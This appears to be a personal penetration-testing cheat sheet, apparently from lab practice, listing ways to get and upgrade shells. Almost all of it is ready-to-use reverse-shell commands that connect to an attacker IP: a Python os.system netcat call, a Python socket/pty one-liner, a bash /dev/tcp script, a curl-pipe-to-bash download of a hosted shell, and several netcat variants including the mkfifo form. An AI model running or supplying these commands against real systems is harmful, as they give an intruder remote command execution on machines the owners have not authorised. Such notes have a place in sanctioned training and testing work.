

## FILE EXEC SHELLS
### PYTHON SHELL 
then i created a malicious python file to execute my code using
```
import os

os.system('busybox nc 192.168.45.168 3306 -e /bin/bash')

```

### PHP
use php rev shell stored in kali
![[Pasted image 20250704110329.png]]

### RUBY
```
echo 'system("/bin/bash")' > app.rb
```
### IMPROVING SHELLS

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

OR
Create a rev shell using online generator, and ran this 
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.158",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
Started a listener and got the shell
OR
Hosting a shell on ur machine and pulling it and running it 
`cat upgr_shell`
```
#!bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.158/4444 0>&1
```

```
curl http:192.168.45.158:81/upgr_shell.sh | bash
```


### NETCAT 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.245 443 >/tmp/f
```
```
nc 192.168.45.245 443 -e /bin/bash
```
```
nc 192.168.45.245 443 -c /bin/bash
```


